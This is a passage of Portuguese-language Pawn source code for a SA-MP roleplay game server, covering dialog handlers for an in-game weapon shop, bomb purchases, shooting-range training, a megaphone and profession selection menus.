					    SendClientMessage(playerid, -1, "Você adquiriu uma Pistola 9mm.");
         				WE_SetInt(gFile, "Pistola_9mm", 1);
         				WE_SaveFile();
         				SetPlayerArmas(playerid);
         			}
         			return 1;
	            }
	            case 1:
	            {
	            	if(WE_GetInt(gFile, "Pistola_S9mm") == 1)
	                {
	               		SendClientMessage(playerid, COR_ERRO, "Você já tem uma Pistola Silenciosa 9mm!");
	                    return 1;
	                }
					if(GetPlayerCash(playerid) < 550)
	            	{
	           			SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro suficiente para comprar uma Pistola Silenciosa 9mm! {FFFFFF}({009900}R$550 {FFFFFF})");
					}
					else if(GetPlayerCash(playerid) >= 550)
					{
					    sGivePlayerCash(playerid, -550);
					    SendClientMessage(playerid, -1, "Você adquiriu uma Pistola Silenciosa 9mm.");
						WE_SetInt(gFile, "Pistola_S9mm", 1);
						WE_SaveFile();
						SetPlayerArmas(playerid);
					}
					return 1;
	            }
	            case 2:
	            {
	                if(WE_GetInt(gFile, "Pistola_Emm") == 1)
	                {
	               		SendClientMessage(playerid, COR_ERRO, "Você já tem uma Pistola Desert Eagle!");
	                    return 1;
	                }
	            	if(GetPlayerCash(playerid) < 3500)
	            	{
	           			SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro suficiente para comprar uma Pistola Desert Eagle! {FFFFFF}({009900}R$3.500 {FFFFFF})");
					}
					else if(GetPlayerCash(playerid) >= 3500)
					{
					    sGivePlayerCash(playerid, -3500);
					    SendClientMessage(playerid, -1, "Você adquiriu uma Desert Eagle.");
						WE_SetInt(gFile, "Pistola_Emm", 1);
						WE_SaveFile();
						SetPlayerArmas(playerid);
					}
					return 1;
	            }
			}
		}
		if(!response)
		{
	    	ShowPlayerDialog(playerid, SLOT_ARMAS+1, DIALOG_STYLE_LIST, "{FF6633}Ammunation Viva WE", "{9C9C9C}Pistolas\n{FF9500}Escopetas\n{FF0000}Metralhadoras\n{8C3F00}Rifles", "Ver", "Voltar");
	   	}
	}
	if(dialogid == SLOT_ARMAS+5)
	{
        if(response)
        {
	        switch(listitem)
	        {
	            case 0:
	            {
	                if(WE_GetInt(gFile, "Shotgun") == 1)
	                {
	               		SendClientMessage(playerid, COR_ERRO, "Você já tem uma Shotgun!");
	                    return 1;
	                }
	                if(GetPlayerCash(playerid) < 5500)
	            	{
	           			SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro suficiente para comprar uma Shotgun! {FFFFFF}({009900}R$5.500{FFFFFF})");
					}
					else if(GetPlayerCash(playerid) >= 5500)
					{
					    sGivePlayerCash(playerid, -5500);
					    SendClientMessage(playerid, -1, "Você adquiriu uma Shotgun.");
						WE_SetInt(gFile, "Shotgun", 1);
						WE_SaveFile();
						SetPlayerArmas(playerid);
					}
					return 1;
	            }
	            case 1:
	            {
	                if(WE_GetInt(gFile, "CombatShotgun") == 1)
	                {
	               		SendClientMessage(playerid, COR_ERRO, "Você já tem uma Combat Shotgun!");
	                    return 1;
	                }
	                if(GetPlayerCash(playerid) < 6500)
	            	{
	           			SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro suficiente para comprar uma Combat Shotgun! {FFFFFF}({009900}R$6.500{FFFFFF})");
					}
					else if(GetPlayerCash(playerid) >= 6500)
					{
					    sGivePlayerCash(playerid, -6500);
					    SendClientMessage(playerid, -1, "Você adquiriu uma Combat Shotgun.");
						WE_SetInt(gFile, "CombatShotgun", 1);
						WE_SaveFile();
						SetPlayerArmas(playerid);
					}
					return 1;
	            }
			}
		}
		if(!response)
		{
	    	ShowPlayerDialog(playerid, SLOT_ARMAS+1, DIALOG_STYLE_LIST, "{FF6633}Ammunation Viva WE", "{9C9C9C}Pistolas\n{FF9500}Escopetas\n{FF0000}Metralhadoras\n{8C3F00}Rifles", "Ver", "Voltar");
	   	}
	}
	if(dialogid == SLOT_ARMAS+6)
	{
        if(response)
        {
	        switch(listitem)
	        {
	            case 0:
	            {
	                if(WE_GetInt(gFile, "MP5") == 1)
	                {
	               		SendClientMessage(playerid, COR_ERRO, "Você já tem uma Metralhadora MP5!");
	                    return 1;
	                }
	                if(GetPlayerCash(playerid) < 4700)
	            	{
	           			SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro suficiente para comprar uma Metralhadora MP5! {FFFFFF}({009900}R$4700{FFFFFF})");
					}
					else if(GetPlayerCash(playerid) >= 4700)
					{
					    sGivePlayerCash(playerid, -4700);
					    SendClientMessage(playerid, -1, "Você adquiriu uma Metralhadora MP5.");
						WE_SetInt(gFile, "MP5", 1);
						WE_SaveFile();
						SetPlayerArmas(playerid);
					}
					return 1;
	            }
	            case 1:
	            {
	                if(WE_GetInt(gFile, "AK47") == 1)
	                {
	               		SendClientMessage(playerid, COR_ERRO, "Você já tem uma Metralhadora AK-47!");
	                    return 1;
	                }
	                if(GetPlayerCash(playerid) < 7000)
	            	{
	           			SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro suficiente para comprar uma Metralhadora AK-47! {FFFFFF}({009900}R$7.000{FFFFFF})");
					}
					else if(GetPlayerCash(playerid) >= 7000)
					{
					    sGivePlayerCash(playerid, -7000);
					    SendClientMessage(playerid, -1, "Você adquiriu uma Metralhadora AK-47.");
						WE_SetInt(gFile, "AK47", 1);
						WE_SaveFile();
						SetPlayerArmas(playerid);
					}
					return 1;
	            }
	            case 2:
	            {
	                if(WE_GetInt(gFile, "M4") == 1)
	                {
	               		SendClientMessage(playerid, COR_ERRO, "Você já tem uma Metralhadora M4!");
	                    return 1;
	                }
	                if(GetPlayerCash(playerid) < 6700)
	            	{
	           			SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro suficiente para comprar uma Metralhadora M4! {FFFFFF}({009900}R$6.700{FFFFFF})");
					}
					else if(GetPlayerCash(playerid) >= 6700)
					{
					    sGivePlayerCash(playerid, -6700);
					    SendClientMessage(playerid, -1, "Você adquiriu uma Metralhadora M4.");
						WE_SetInt(gFile, "M4", 1);
						WE_SaveFile();
						SetPlayerArmas(playerid);
					}
					return 1;
	            }
			}
		}
		if(!response)
		{
	    	ShowPlayerDialog(playerid, SLOT_ARMAS+1, DIALOG_STYLE_LIST, "{FF6633}Ammunation Viva WE", "{9C9C9C}Pistolas\n{FF9500}Escopetas\n{FF0000}Metralhadoras\n{8C3F00}Rifles", "Ver", "Voltar");
	   	}
	}
	if(dialogid == SLOT_ARMAS+7)
	{
        if(response)
        {
	        switch(listitem)
	        {
	            case 0:
	            {
	                if(WE_GetInt(gFile, "Rifle") == 1)
	                {
	               		SendClientMessage(playerid, COR_ERRO, "Você já tem um Rifle!");
	                    return 1;
	                }
	                if(GetPlayerCash(playerid) < 7500)
	            	{
	           			SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro suficiente para comprar um Rifle! {FFFFFF}({009900}R$7.500{FFFFFF})");
					}
					else if(GetPlayerCash(playerid) >= 7500)
					{
					    sGivePlayerCash(playerid, -7500);
					    SendClientMessage(playerid, -1, "Você adquiriu um Rifle.");
	            		WE_SetInt(gFile, "Rifle", 1);
	            		WE_SaveFile();
	            		SetPlayerArmas(playerid);
	            	}
	            	return 1;
	            }
	            case 1:
	            {
	                if(WE_GetInt(gFile, "Sniper") == 1)
	                {
	               		SendClientMessage(playerid, COR_ERRO, "Você já tem uma Sniper Rifle!");
	                    return 1;
	                }
	                if(GetPlayerCash(playerid) < 9000)
	            	{
	           			SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro suficiente para comprar uma Sniper Rifle ! {FFFFFF}({009900}R$9.000{FFFFFF})");
					}
					else if(GetPlayerCash(playerid) >= 9000)
					{
					    sGivePlayerCash(playerid, -9000);
					    SendClientMessage(playerid, -1, "Você adquiriu uma Sniper Rifle.");
	                	WE_SetInt(gFile, "Sniper", 1);
	                	WE_SaveFile();
	                	SetPlayerArmas(playerid);
	                }
	                return 1;
	            }
			}
		}
		if(!response)
		{
	    	ShowPlayerDialog(playerid, SLOT_ARMAS+1, DIALOG_STYLE_LIST, "{FF6633}Ammunation Viva WE", "{9C9C9C}Pistolas\n{FF9500}Escopetas\n{FF0000}Metralhadoras\n{8C3F00}Rifles", "Ver", "Voltar");
	   	}
	}
	if(dialogid == SLOT_ARMAS+2)
	{
        if(response)
        {
	        switch(listitem)
	        {
	            case 0:
	            {
	                if(WE_GetInt(gFile, "SocoIngles") == 1)
	                {
	               		SendClientMessage(playerid, COR_ERRO, "Você já tem um Soco Inglês!");
	                    return 1;
	                }
	                if(GetPlayerCash(playerid) < 200)
	            	{
	           			SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro suficiente para comprar um Soco Inglês ! {FFFFFF}({009900}R$200{FFFFFF})");
					}
					else if(GetPlayerCash(playerid) >= 200)
					{
					    sGivePlayerCash(playerid, -200);
					    SendClientMessage(playerid, -1, "Você adquiriu um Soco Inglês.");
	            		WE_SetInt(gFile, "SocoIngles", 1);
	            		WE_SaveFile();
	            		SetPlayerArmas(playerid);
	            	}
	            	return 1;
	            }
	            case 1:
	            {
                 	if(WE_GetInt(gFile, "TacoGolf") == 1)
	                {
	               		SendClientMessage(playerid, COR_ERRO, "Você já tem um Taco de Golf!");
	                    return 1;
	                }
	                if(GetPlayerCash(playerid) < 100)
	            	{
	           			SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro suficiente para comprar um Taco de Golf ! {FFFFFF}({009900}R$100{FFFFFF})");
					}
					else if(GetPlayerCash(playerid) >= 100)
					{
					    sGivePlayerCash(playerid, -100);
					    SendClientMessage(playerid, -1, "Você adquiriu um Taco de Golf.");
	            		WE_SetInt(gFile, "TacoGolf", 1);
	            		WE_SaveFile();
	            		SetPlayerArmas(playerid);
	            	}
	            	return 1;
	            }
	            case 2:
	            {
	                if(WE_GetInt(gFile, "Cacetete") == 1)
	                {
	               		SendClientMessage(playerid, COR_ERRO, "Você já tem um Cacetete!");
	                    return 1;
	                }
	                if(GetPlayerCash(playerid) < 300)
	            	{
	           			SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro suficiente para comprar um Cacetete ! {FFFFFF}({009900}R$300{FFFFFF})");
					}
					else if(GetPlayerCash(playerid) >= 300)
					{
					    sGivePlayerCash(playerid, -300);
					    SendClientMessage(playerid, -1, "Você adquiriu um Cacetete.");
	            		WE_SetInt(gFile, "Cacetete", 1);
	            		WE_SaveFile();
	            		SetPlayerArmas(playerid);
	            	}
	            	return 1;
	            }
	            case 3:
	            {
	                if(WE_GetInt(gFile, "Faca") == 1)
	                {
	               		SendClientMessage(playerid, COR_ERRO, "Você já tem uma Faca!");
	                    return 1;
	                }
	            	if(GetPlayerCash(playerid) < 300)
	            	{
	           			SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro suficiente para comprar uma Faca ! {FFFFFF}({009900}R$100{FFFFFF})");
					}
					else if(GetPlayerCash(playerid) >= 300)
					{
					    sGivePlayerCash(playerid, -300);
					    SendClientMessage(playerid, -1, "Você adquiriu uma Faca.");
	            		WE_SetInt(gFile, "Faca", 1);
	            		WE_SaveFile();
	            		SetPlayerArmas(playerid);
	            	}
	            	return 1;
	            }
	            case 4:
	            {
	                if(WE_GetInt(gFile, "Baseball") == 1)
	                {
	               		SendClientMessage(playerid, COR_ERRO, "Você já tem um Taco de Baseball!");
	                    return 1;
	                }
	                if(GetPlayerCash(playerid) < 250)
	            	{
	           			SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro suficiente para comprar uma Taco de Baseball ! {FFFFFF}({009900}R$250{FFFFFF})");
					}
					else if(GetPlayerCash(playerid) >= 250)
					{
					    sGivePlayerCash(playerid, -250);
					    SendClientMessage(playerid, -1, "Você adquiriu um Taco de Baseball.");
	            		WE_SetInt(gFile, "Baseball", 1);
	            		WE_SaveFile();
	            		SetPlayerArmas(playerid);
	            	}
	            	return 1;
	            }
	            case 5:
	            {
	                if(WE_GetInt(gFile, "Inchada") == 1)
	                {
	               		SendClientMessage(playerid, COR_ERRO, "Você já tem uma Inchada!");
	                    return 1;
	                }
	                if(GetPlayerCash(playerid) < 50)
	            	{
	           			SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro suficiente para comprar uma Inchada ! {FFFFFF}({009900}R$50{FFFFFF})");
					}
					else if(GetPlayerCash(playerid) >= 50)
					{
					    sGivePlayerCash(playerid, -50);
					    SendClientMessage(playerid, -1, "Você adquiriu uma Inchada.");
	            		WE_SetInt(gFile, "Inchada", 1);
	            		WE_SaveFile();
	            		SetPlayerArmas(playerid);
	            	}
	            	return 1;
	            }
	            case 6:
	            {
	                if(WE_GetInt(gFile, "TacoBilhar") == 1)
	                {
	               		SendClientMessage(playerid, COR_ERRO, "Você já tem um Taco de Bilhar!");
	                    return 1;
	                }
	                if(GetPlayerCash(playerid) < 120)
	            	{
	           			SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro suficiente para comprar um Taco de Bilhar ! {FFFFFF}({009900}R$120{FFFFFF})");
					}
					else if(GetPlayerCash(playerid) >= 120)
					{
					    sGivePlayerCash(playerid, -120);
					    SendClientMessage(playerid, -1, "Você adquiriu um Taco de Bilhar.");
	            		WE_SetInt(gFile, "TacoBilhar", 1);
	            		WE_SaveFile();
	            		SetPlayerArmas(playerid);
	            	}
	            	return 1;
	            }
	            case 7:
	            {
	                if(WE_GetInt(gFile, "Katana") == 1)
	                {
	               		SendClientMessage(playerid, COR_ERRO, "Você já tem uma Katana!");
	                    return 1;
	                }
	                if(GetPlayerCash(playerid) < 350)
	            	{
	           			SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro suficiente para comprar uma Katana ! {FFFFFF}({009900}R$350{FFFFFF})");
					}
					else if(GetPlayerCash(playerid) >= 350)
					{
					    sGivePlayerCash(playerid, -350);
					    SendClientMessage(playerid, -1, "Você adquiriu uma Katana.");
	            		WE_SetInt(gFile, "Katana", 1);
	            		WE_SaveFile();
	            		SetPlayerArmas(playerid);
                    }
                    return 1;
	            }
	            case 8:
	            {
	                if(WE_GetInt(gFile, "SerraEletrica") == 1)
	                {
	               		SendClientMessage(playerid, COR_ERRO, "Você já tem uma Serra Eletrica!");
	                    return 1;
	                }
	                if(GetPlayerCash(playerid) < 3000)
	            	{
	           			SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro suficiente para comprar uma Serra Elétrica ! {FFFFFF}({009900}R$3000{FFFFFF})");
					}
					else if(GetPlayerCash(playerid) >= 3000)
					{
					    sGivePlayerCash(playerid, -3000);
					    SendClientMessage(playerid, -1, "Você adquiriu uma Serra Elétrica.");
	            		WE_SetInt(gFile, "SerraEletrica", 1);
	            		WE_SaveFile();
	            		SetPlayerArmas(playerid);
                    }
                    return 1;
	            }
	        }
		}
		if(!response)
		{
			ShowPlayerDialog(playerid, SLOT_ARMAS, DIALOG_STYLE_LIST, "{FF6633}Ammunation Viva WE", "{FF0000}Armas de Fogo\n{FFFFFF}Armas Brancas\n{1E90FF}Acessórios", "Ver", "Sair");
		}
	}
	if(dialogid == SLOT_ARMAS+3)
	{
        if(response)
        {
	        switch(listitem)
	        {
	            case 0:
	            {
	                if(WE_GetInt(gFile, "Spray") == 1)
	                {
	               		SendClientMessage(playerid, COR_ERRO, "Você já tem um  Spray!");
	                    return 1;
	                }
	                if(GetPlayerCash(playerid) < 50)
	            	{
	           			SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro suficiente para comprar um Spray ! {FFFFFF}({009900}R$50{FFFFFF})");
					}
					else if(GetPlayerCash(playerid) >= 50)
					{
					    sGivePlayerCash(playerid, -50);
					    SendClientMessage(playerid, -1, "Você adquiriu um Spray.");
	            		WE_SetInt(gFile, "Spray", 1);
	            		WE_SaveFile();
	            		SetPlayerArmas(playerid);
	            	}
	            	return 1;
	            }
	            case 1:
	            {
	                if(WE_GetInt(gFile, "Camera") == 1)
	                {
	               		SendClientMessage(playerid, COR_ERRO, "Você já tem uma Camêra!");
	                    return 1;
	                }
	                if(GetPlayerCash(playerid) < 1000)
	            	{
	           			SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro suficiente para comprar uma Camêra ! {FFFFFF}({009900}R$1000{FFFFFF})");
					}
					else if(GetPlayerCash(playerid) >= 1000)
					{
					    sGivePlayerCash(playerid, -1000);
					    SendClientMessage(playerid, -1, "Você adquiriu uma Camêra.");
						WE_SetInt(gFile, "Camera", 1);
						WE_SaveFile();
						SetPlayerArmas(playerid);
					}
					return 1;
	            }
	            case 2:
	            {
	                if(WE_GetInt(gFile, "Paraquedas") == 1)
	                {
	               		SendClientMessage(playerid, COR_ERRO, "Você já tem um Paraquedas!");
	                    return 1;
	                }
	                if(GetPlayerCash(playerid) < 800)
	            	{
	           			SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro suficiente para comprar um Paraquedas  ! {FFFFFF}({009900}R$800{FFFFFF})");
					}
					else if(GetPlayerCash(playerid) >= 800)
					{
					    sGivePlayerCash(playerid, -800);
					    SendClientMessage(playerid, -1, "Você adquiriu um Paraquedas.");
						WE_SetInt(gFile, "Paraquedas", 1);
						WE_SaveFile();
						SetPlayerArmas(playerid);
					}
					return 1;
	            }
			}
		}
		if(!response)
		{
			ShowPlayerDialog(playerid, SLOT_ARMAS, DIALOG_STYLE_LIST, "{FF6633}Ammunation Viva WE", "{FF0000}Armas de Fogo\n{FFFFFF}Armas Brancas\n{1E90FF}Acessórios", "Ver", "Sair");
		}
	}
	if(dialogid == D_BOMBAS)
    {
        if(response)
        {
	        switch(listitem)
	        {
	          	case 0:
	            {
	                if(pBombas[playerid] >= 10) return SendClientMessage(playerid, COR_ERRO, "Você já atingiu o limite de bombas carregadas (10), use-as!");
	                pBombas[playerid] += 1;
	                GivePlayerCash(playerid, -1200);
	                SendClientMessage(playerid, AZUL_WE, "Você comprou uma bomba!");
					WE_SetInt(gFile, "Bombas", pBombas[playerid]);
					WE_SaveFile();
	            }
	            case 1:
	            {
	    			if(pBombas[playerid] > 0) return SendClientMessage(playerid, COR_ERRO, "Você possui mais de uma bomba, deve comprar por unidades!");
	    			pBombas[playerid] += 10;
	    			GivePlayerCash(playerid, -10000);
	    			SendClientMessage(playerid, AZUL_WE, "Você comprou um pacote com 10 bombas!");
					WE_SetInt(gFile, "Bombas", pBombas[playerid]);
					WE_SaveFile();
	            }
			}
		}
	}
	if(dialogid == D_TREINOAMMU)
    {
        if(response)
        {
	        switch(listitem)
	        {
	          	case 0:
	            {
	                if(GetPlayerCash(playerid) < 700) return SendClientMessage(playerid, COR_ERRO, "Você não possui dinheiro suficiente!");
					ResetPlayerWeapons(playerid);
					pInfo[playerid][Treinando] = true;
					tPistol[playerid] = true;
					SetPlayerHealth(playerid,cellmax);
					SetPlayerPos(playerid,304.06027, -142.14278, 1003.65804);
					SendClientMessage(playerid,COR_ERRO,"Acerte os alvos durante 5 minutos para completar o teste!");
					GivePlayerWeapon(playerid, 22, 99999);
					SetTimerEx("FimTreino",300000,false,"i",playerid);
					for(new i = 0; i < MAX_PLAYERS; i++)
					{
					    if(pInfo[i][Treinando] == false)
					    {
							ObjetosAmmuCheck = SetTimer("ObjetosAmmu",500,false);
							break;
						}
					}
				}
	            case 1:
	            {
	    			if(GetPlayerCash(playerid) < 1200) return SendClientMessage(playerid, COR_ERRO, "Você não possui dinheiro suficiente!");
	    			ResetPlayerWeapons(playerid);
					pInfo[playerid][Treinando] = true;
					tShotgun[playerid] = true;
					SetPlayerPos(playerid,304.06027, -142.14278, 1003.65804);
					GivePlayerWeapon(playerid, 25, 99999);
					SetTimerEx("FimTreino",300000,false,"i",playerid);
					for(new i = 0; i < MAX_PLAYERS; i++)
					{
					    if(pInfo[i][Treinando] == false)
					    {
							ObjetosAmmuCheck = SetTimer("ObjetosAmmu",500,false);
							break;
						}
					}
	            }
	            case 2:
	            {
	            	if(GetPlayerCash(playerid) < 1600) return SendClientMessage(playerid, COR_ERRO, "Você não possui dinheiro suficiente!");
	            	ResetPlayerWeapons(playerid);
					pInfo[playerid][Treinando] = true;
					tMicro[playerid] = true;
					SetPlayerPos(playerid,304.06027, -142.14278, 1003.65804);
					GivePlayerWeapon(playerid, 32, 99999);
					SetTimerEx("FimTreino",300000,false,"i",playerid);
					for(new i = 0; i < MAX_PLAYERS; i++)
					{
					    if(pInfo[i][Treinando] == false)
					    {
							ObjetosAmmuCheck = SetTimer("ObjetosAmmu",500,false);
							break;
						}
					}
	            }
	            case 3:
				{
					if(GetPlayerCash(playerid) < 2100) return SendClientMessage(playerid, COR_ERRO, "Você não possui dinheiro suficiente!");
					ResetPlayerWeapons(playerid);
					pInfo[playerid][Treinando] = true;
					tSMG[playerid] = true;
                    SetPlayerPos(playerid,304.06027, -142.14278, 1003.65804);
					GivePlayerWeapon(playerid, 29, 99999);
					SetTimerEx("FimTreino",300000,false,"i",playerid);
					for(new i = 0; i < MAX_PLAYERS; i++)
					{
					    if(pInfo[i][Treinando] == false)
					    {
							ObjetosAmmuCheck = SetTimer("ObjetosAmmu",500,false);
							break;
						}
					}
				}
				case 4:
				{
					if(GetPlayerCash(playerid) < 3000) return SendClientMessage(playerid, COR_ERRO, "Você não possui dinheiro suficiente!");
					ResetPlayerWeapons(playerid);
					pInfo[playerid][Treinando] = true;
					tRifle[playerid] = true;
					SetPlayerPos(playerid,304.06027, -142.14278, 1003.65804);
					GivePlayerWeapon(playerid, 31, 99999);
					SetTimerEx("FimTreino",300000,false,"i",playerid);
					for(new i = 0; i < MAX_PLAYERS; i++)
					{
					    if(pInfo[i][Treinando] == false)
					    {
							ObjetosAmmuCheck = SetTimer("ObjetosAmmu",500,false);
							break;
						}
					}
				}
				case 5:
				{
					if(GetPlayerCash(playerid) < 5000) return SendClientMessage(playerid, COR_ERRO, "Você não possui dinheiro suficiente!");
					ResetPlayerWeapons(playerid);
					pInfo[playerid][Treinando] = true;
					tSniper[playerid] = true;
				    SetPlayerPos(playerid,304.06027, -142.14278, 1003.65804);
					GivePlayerWeapon(playerid, 34, 99999);
					SetTimerEx("FimTreino",300000,false,"i",playerid);
					for(new i = 0; i < MAX_PLAYERS; i++)
					{
					    if(pInfo[i][Treinando] == false)
					    {
							ObjetosAmmuCheck = SetTimer("ObjetosAmmu",500,false);
							break;
						}
					}
				}
			}
		}
	}
	//Megaphone
	if(dialogid == DIALOG_MEGAPHONE_MENU)
	{
		if(!response) return SendClientMessage(playerid, AZUL_WE, "Você não usou o megaphone!");
		new soundid, tw1 = 0;
		for(new w1 = 0; w1 < sizeof(MegaphoneSounds); w1++)
		{
			if(tw1 != listitem)
			{
				tw1++;
				continue;
			}
			new tmp1[2][128];
			split(MegaphoneSounds[w1], tmp1, ',');
			soundid = strval(tmp1[0]);
			break;
		}
		new Float:pos[4];
		GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
		PlaySoundEx(soundid, pos[0], pos[1], pos[2], 30);
		return 1;
	}
	if(dialogid == D_PROFS)
    {
        if(response)
        {
	        switch(listitem)
	        {
	          	case 0:
	            {
				    ShowPlayerDialog(playerid, D_PARTI, DIALOG_STYLE_LIST, "{FFFFFF}Profissão - {FFFF00}Nível {FFFFFF}- {3DB134}Salário",
					"Seguranca Particular - {FFF000}Nível 20 {FFFFFF}- {3DB134}R$800\nMotorista Particular - {FFF000}Nível 20 {FFFFFF}- {3DB134}R$750\nPiloto(a) Particular - {FFF000}Nível 45 {FFFFFF}- {3DB134}R$2000\n{4995CC}Voltar", "OK", "Voltar");
	            }
	            case 1:
	            {
	    			ShowPlayerDialog(playerid, D_TRANS, DIALOG_STYLE_LIST, "{FFFFFF}Profissão - {FFFF00}Nível {FFFFFF}- {3DB134}Salário",
					"Motorista de Ônibus - {FFF000}Nível 30 {FFFFFF}- {3DB134}R$700\nTaxista - {FFF000}Nível 0 {FFFFFF}- {3DB134}R$600\nMoto Taxista - {FFF000}Nível 25 {FFFFFF}- {3DB134}R$650\n{4995CC}Voltar", "OK", "Voltar");
	            }
	            case 2:
	            {
				    ShowPlayerDialog(playerid, D_TRANP, DIALOG_STYLE_LIST, "{FFFFFF}Profissão - {FFFF00}Nível {FFFFFF}- {3DB134}Salário",
					"Caminhoneiro(a) - {FFF000}Nível 0 {FFFFFF}- {3DB134}R$800\nMaquinista - {FFF000}Nível 10 {FFFFFF}- {3DB134}R$800\nTransportador(a) - {FFF000}Nível 0 {FFFFFF}- {3DB134}R$700\nPiloto - {FFF000}Nível 5 {FFFFFF}- {3DB134}R$820\n{4995CC}Voltar", "OK", "Voltar");
	            }
        		case 3:
	            {
				    ShowPlayerDialog(playerid, D_POLIC, DIALOG_STYLE_LIST, "{FFFFFF}Profissão - {FFFF00}Nível {FFFFFF}- {3DB134}Salário",
					"Guarda de Trânsito - {FFF000}Nível 30 {FFFFFF}- {3DB134}R$900\nPolicial Civil - {FFF000}Nível 80 {FFFFFF}- {3DB134}R$1500\nPolicial Militar - {FFF000}Nível 100 {FFFFFF}- {3DB134}R$1800\nPolicial Rodoviário - {FFF000}Nível 180 {FFFFFF}- {3DB134}R$2000\nPolicial Federal - {FFF000}Nível 250 {FFFFFF}- {3DB134}R$2500\n{4995CC}Voltar", "OK", "Voltar");
	            }
 	            case 4:
	            {
				    ShowPlayerDialog(playerid, D_OUTRA, DIALOG_STYLE_LIST, "{FFFFFF}Profissão - {FFFF00}Nível {FFFFFF}- {3DB134}Salário",
					"Médico(a) - {FFF000}Nível 25 {FFFFFF}- {3DB134}R$800\nAdvogado(a) - {FFF000}Nível 60 {FFFFFF}- {3DB134}R$750\nBombeiro(a) - {FFF000}Nível 120 {FFFFFF}- {3DB134}R$950\nInstrutor(a) - {FFF000}Nível 40 {FFFFFF}- {3DB134}R$900\n{4995CC}Voltar", "OK", "Voltar");
	            }
	            case 5:
	            {
				    ShowPlayerDialog(playerid, D_GOVER, DIALOG_STYLE_LIST, "{FFFFFF}Profissão - {FFFF00}Nível {FFFFFF}- {3DB134}Salário",
					"Deputado(a) - {FFF000}Nível 350 {FFFFFF}- {3DB134}R$2000\nPrefeito(a) - {FFF000}Nível 500 {FFFFFF}- {3DB134}R$3000\nGovernador(a) - {FFF000}Nível 1350 {FFFFFF}- {3DB134}R$5000\n{4995CC}Voltar", "OK", "Voltar");
	            }
	            case 6:
	            {
				    ShowPlayerDialog(playerid, D_CRIME, DIALOG_STYLE_LIST, "{FFFFFF}Profissão - {FFFF00}Nível {FFFFFF}- {3DB134}Salário",
      				"Traficante de Drogas - {FFF000}Nível 15 {FFFFFF}- {3DB134}R$700\nTraficante de Armas - {FFF000}Nível 70 {FFFFFF}- {3DB134}R$750\nHitman - {FFF000}Nível 300 {FFFFFF}- {3DB134}R$2500\nFranco-Atirador(a) - {FFF000}Nível 120 {FFFFFF}- {3DB134}R$900\nTerrorista - {FFF000}Nível 160 {FFFFFF}- {3DB134}R$1000\nMafioso(a) - {FFF000}Nível 350 {FFFFFF}- {3DB134}R$1500\nContrabandista - {FFF000}Nível 130 {FFFFFF}- {3DB134}R$1500\n{4995CC}Voltar", "OK", "Voltar");
	            }
	            case 7:
	            {
				    ShowPlayerDialog(playerid, D_OUTR2, DIALOG_STYLE_LIST, "{FFFFFF}Profissão - {FFFF00}Nível {FFFFFF}- {3DB134}Salário",
					"Pescador(a) - {FFF000}Nível 0 {FFFFFF}- {3DB134}R$550\nPizza Boy - {FFF000}Nível 0 {FFFFFF}- {3DB134}R$550\nFotógrafo(a) - {FFF000}Nível 0 {FFFFFF}- {3DB134}R$600\nMecânico(a) - {FFF000}Nível 20 {FFFFFF}- {3DB134}R$750\nFlanelinha - {FFF000}Nível 50 {FFFFFF}- {3DB134}R$650\nProstituta - {FFF000}Nível 10 {FFFFFF}- {3DB134}R$850\nPadre - {FFF000}Nível 50 {FFFFFF}- {3DB134}R$600\nRepórter - {FFF000}Nível 25 {FFFFFF}- {3DB134}R$700\n{4995CC}Voltar", "OK", "Voltar");
	            }
			}
		}
	}
	if(dialogid == D_TRANS)
	{
        if(response)
        {
	        switch(listitem)
	        {
	            case 0:
	            {
	                if(pInfo[playerid][Prof] == MOTORISTA_ONIBUS)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) Motorista de Ônibus!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 30)
	                {
	                    SendClientMessage(playerid, COR_MOTORISTABUS, "Parabéns, você agora é um(a) Motorista de Ônibus.");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = MOTORISTA_ONIBUS;
	                    SetPlayerColor(playerid, COR_MOTORISTABUS);
						ShowPlayerDialog(playerid, D_ISPAW, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Spawn", "Caso opte por ser levado ao seu local de trabalho, selecione 'Sim'\nPara permanecer na agência, selecione 'Não'", "Sim", "Não");
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não tem nível o suficiente para esta profissão!");
					    SendClientMessage(playerid, COR_BRANCO, "Essa profissão requer no mínimo nível 30 ou superior.");
					    PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
					}
					return 1;
	            }
	            case 1:
	            {
	                if(pInfo[playerid][Prof] == TAXISTA)
				    {
						SendClientMessage(playerid, COR_ERRO, "Você já é um(a) Taxista!");
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0);
						return 1;
					}
	                if(pInfo[playerid][Level] >= 0)
	                {
	                    SendClientMessage(playerid, COR_TAXISTA, "Parabéns, você agora é um(a) Taxista.");
	                    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
	                    pInfo[playerid][Prof] = TAXISTA;
	                    SetPlayerColor(playerid, COR_TAXISTA);
